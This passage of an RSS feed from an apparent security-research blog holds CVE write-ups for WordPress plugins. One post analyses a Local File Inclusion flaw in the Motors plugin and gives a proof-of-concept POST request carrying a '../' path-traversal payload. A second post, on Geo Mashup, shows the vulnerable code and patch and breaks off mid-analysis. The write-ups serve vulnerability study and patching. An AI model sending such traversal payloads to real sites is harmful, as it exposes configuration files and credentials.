= locate_template( &amp;#39;listings/&amp;#39; . $template );&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( ! ( $located ) ) {&#xA;&#x9;&#x9;&#x9;if ( file_exists( realpath( apply_filters( &amp;#39;stm_listings_template_file&amp;#39;, STM_LISTINGS_PATH, $template ) . &amp;#39;/templates/&amp;#39; . $template ) ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$located = realpath( apply_filters( &amp;#39;stm_listings_template_file&amp;#39;, STM_LISTINGS_PATH, $template ) . &amp;#39;/templates/&amp;#39; . $template );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( file_exists( $located ) ) {&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return apply_filters( &amp;#39;stm_listings_locate_template&amp;#39;, $located, $templates );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function iterates over &lt;code&gt;$templates&lt;/code&gt; to locate a valid template path:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Appends &lt;code&gt;.php&lt;/code&gt; if missing.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If the path contains &lt;code&gt;&#39;partials/&#39;&lt;/code&gt;, it calls &lt;code&gt;locate_template( $template )&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Otherwise, it looks inside &lt;code&gt;&#39;listings/&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If still not found, it checks directly inside the plugin path:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;STM_LISTINGS_PATH . &amp;#39;/templates/&amp;#39; . $template&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Once a valid file is found, the loop breaks and returns that path.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/locate_template/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;locate_template()&lt;/code&gt;&lt;/a&gt; is a &lt;strong&gt;WordPress core&lt;/strong&gt; function that searches the active theme for the given template file. If found, it returns the full path; otherwise, it returns an empty string — meaning we need to reference an existing file.&lt;/p&gt;&#xA;&lt;p&gt;👉 The result is returned via the filter &lt;code&gt;stm_listings_locate_template&lt;/code&gt; as &lt;code&gt;$locate&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/search1.png&#34;&#xA;    alt=&#34;No filter registered for stm_listings_locate_template&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;No filter registered for &lt;code&gt;stm_listings_locate_template&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;No filters are registered for this hook, meaning &lt;code&gt;$locate&lt;/code&gt; is returned unchanged.&lt;/p&gt;&#xA;&lt;p&gt;Therefore, the conditions required for exploitation are:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The &lt;code&gt;template&lt;/code&gt; parameter includes &lt;code&gt;partials/&lt;/code&gt; or &lt;code&gt;listings/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Sufficient &lt;code&gt;../&lt;/code&gt; traversal so that &lt;code&gt;locate_template()&lt;/code&gt; returns empty but &lt;code&gt;include&lt;/code&gt; does not error when the path exists.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Add a simple test code to &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;echo &amp;#34;payload&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send a POST request containing the LFI payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;action=grid_tabs_widget&amp;amp;tab_type=popular&amp;amp;per_page=8&amp;amp;template=/partials/../../../../../payload&amp;amp;img_size=&amp;amp;security=d15dd83890&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/result.png&#34;&#xA;    alt=&#34;Successful LFI result&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Successful LFI result&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-32654 is an &lt;strong&gt;LFI vulnerability&lt;/strong&gt; in &lt;strong&gt;Motors ≤ 1.4.71&lt;/strong&gt;, caused by an unsanitized &lt;code&gt;template&lt;/code&gt; parameter that allows path traversal and arbitrary &lt;code&gt;include()&lt;/code&gt; calls.&#xA;The public endpoint (&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;) and nonce exposed in the front-end make it easily exploitable.&#xA;It was patched in &lt;strong&gt;v1.4.72&lt;/strong&gt; by normalizing file names and validating them against a &lt;strong&gt;whitelist&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never use raw user input to construct file paths for &lt;code&gt;include&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Always enforce a &lt;strong&gt;whitelist&lt;/strong&gt; of valid templates/paths.&lt;/li&gt;&#xA;&lt;li&gt;Normalize (e.g. &lt;code&gt;sanitize_file_name()&lt;/code&gt;/&lt;code&gt;sanitize_key()&lt;/code&gt;), and use &lt;code&gt;realpath()&lt;/code&gt; to ensure paths remain within the intended directory.&lt;/li&gt;&#xA;&lt;li&gt;For public endpoints, strictly validate inputs — don’t rely solely on nonce protection.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — HackTricks&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/motors-car-dealership-classified-listings/vulnerability/wordpress-motors-plugin-1-4-65-local-file-inclusion-vulnerability-2?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Motors Plugin &amp;lt;= 1.4.71 is vulnerable to Local File Inclusion&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48293 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-13-cve-2025-48293/</link>
      <pubDate>Mon, 13 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-13-cve-2025-48293/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Geo Mashup&lt;/strong&gt; plugin version &lt;strong&gt;≤ 1.13.16&lt;/strong&gt; contains a &lt;strong&gt;Local File Inclusion&lt;/strong&gt; vulnerability that allows an unauthenticated attacker to control the file parameter used in &lt;code&gt;include/require&lt;/code&gt;, thereby injecting or reading local files on the server (for example configuration files containing credentials), leading to leakage of sensitive information and, in some configurations, potential code execution.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48293&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48293&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.13.16&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.13.17&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/geo-mashup/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Geo Mashup Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Geo Mashup&lt;/strong&gt;: &lt;strong&gt;1.13.16&lt;/strong&gt; (vulnerable) and &lt;strong&gt;1.13.17&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/comparison tool to inspect differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable code&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function generate_object_html( ) {&#xA;    $template_base = ( isset( $_GET[&amp;#39;template&amp;#39;] ) ) ? $_GET[&amp;#39;template&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    // other logc&#xA;    load_template( GeoMashup::locate_template( $template_base ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$template_base&lt;/code&gt; is taken directly from &lt;code&gt;$_GET[&#39;template&#39;]&lt;/code&gt; &lt;strong&gt;without any checks/sanitization&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The value is passed to &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt; and then used with &lt;a href=&#34;https://developer.wordpress.org/reference/functions/load_template/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;load_template()&lt;/code&gt;&lt;/a&gt; — an attacker can control the file path to be included.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function generate_object_html( ) {&#xA;    $template_base = ( isset( $_GET[&amp;#39;template&amp;#39;] ) ) ? sanitize_key($_GET[&amp;#39;template&amp;#39;]) : &amp;#39;&amp;#39;;&#xA;    // other logic&#xA;    load_template( GeoMashup::locate_template( $template_base ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_key/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_key()&lt;/code&gt;&lt;/a&gt; is applied to &lt;code&gt;template&lt;/code&gt; =&amp;gt; removes unsafe characters, prevents &lt;code&gt;../&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt;, and special characters, reducing the risk of &lt;strong&gt;path traversal&lt;/strong&gt; and &lt;strong&gt;LFI&lt;/strong&gt; from the &lt;code&gt;template&lt;/code&gt; parameter.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;We analyze the logic in &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt; to see how it affects &lt;code&gt;$template_base&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function locate_template( $template_base ) {&#xA;    $template = locate_template( array(&amp;#34;geo-mashup-$template_base.php&amp;#34;) );&#xA; &#xA;    if ( empty( $template ) || !is_readable( $template ) ) {&#xA;        $template = path_join( GEO_MASHUP_DIR_PATH, &amp;#34;default-templates/$template_base.php&amp;#34; );&#xA;    }&#xA;    return $template;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$template&lt;/code&gt; is reassigned by calling &lt;code&gt;locate_template()&lt;/code&gt; (from &lt;strong&gt;template.php&lt;/strong&gt;) with the argument &lt;code&gt;geo-mashup-$template_base.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) {&#xA;&#x9;global $wp_stylesheet_path, $wp_template_path;&#xA;&#xA;&#x9;if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) {&#xA;&#x9;&#x9;wp_set_template_globals();&#xA;&#x9;}&#xA;&#xA;&#x9;$is_child_theme = is_child_theme();&#xA;&#xA;&#x9;$located = &amp;#39;&amp;#39;;&#xA;&#x9;foreach ( (array) $template_names as $template_name ) {&#xA;&#x9;&#x9;if ( ! $template_name ) {&#xA;&#x9;&#x9;&#x9;continue;&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;if ( file_exists( $wp_stylesheet_path . &amp;#39;/&amp;#39; . $template_name ) ) {&#xA;&#x9;&#x9;&#x9;$located = $wp_stylesheet_path . &amp;#39;/&amp;#39; . $template_name;&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;} elseif ( $is_child_theme &amp;amp;&amp;amp; file_exists( $wp_template_path . &amp;#39;/&amp;#39; . $template_name ) ) {&#xA;&#x9;&#x9;&#x9;$located = $wp_template_path . &amp;#39;/&amp;#39; . $template_name;&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;} elseif ( file_exists( ABSPATH . WPINC . &amp;#39;/theme-compat/&amp;#39; . $template_name ) ) {&#xA;&#x9;&#x9;&#x9;$located = ABSPATH . WPINC . &amp;#39;/theme-compat/&amp;#39; . $template_name;&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;if ( $load &amp;amp;&amp;amp; &amp;#39;&amp;#39; !== $located ) {&#xA;&#x9;&#x9;load_template( $located, $load_once, $args );&#xA;&#x9;}&#xA;&#xA;&#x9;return $located;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The logic checks for the existence of files when concatenated with &lt;code&gt;$template_name&lt;/code&gt;; if none exist it returns an empty string &lt;code&gt;&#39;&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/debug1.png&#34;&#xA;    alt=&#34;File existence related 